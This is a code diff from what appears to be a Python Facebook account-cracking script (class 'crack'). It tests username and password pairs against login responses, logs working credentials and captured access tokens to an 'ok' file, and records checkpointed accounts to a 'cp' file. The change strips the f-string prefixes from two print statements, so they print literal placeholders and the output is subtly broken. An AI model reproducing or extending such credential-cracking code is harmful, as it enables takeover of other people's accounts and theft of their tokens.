@@ -147,12 +147,12 @@ class crack:
 			if "session_key" in send or "EAAA" in send:
 				ok+=1
 				open('ok','a').write(user+'|'+pw+'\n')
-				print(f'\r\33[32;1m* --> [OK] {user}|{pw}|{send["access_token"]}\33[37;1m                     \n',end='')
+				print('\r\33[32;1m* --> [OK] {user}|{pw}|{send["access_token"]}\33[37;1m                     \n',end='')
 				break
 			elif "www.facebook.com" in send["error_msg"]:
 				cp+=1
 				open('cp','a').write(user+'|'+pw+'\n')
-				print(f'\r\33[1;33m* --> [CP] {user}|{pw}\33[37;1m                      \n',end='')
+				print('\r\33[1;33m* --> [CP] {user}|{pw}\33[37;1m                      \n',end='')
 				break
 				
 	def kirim(self):
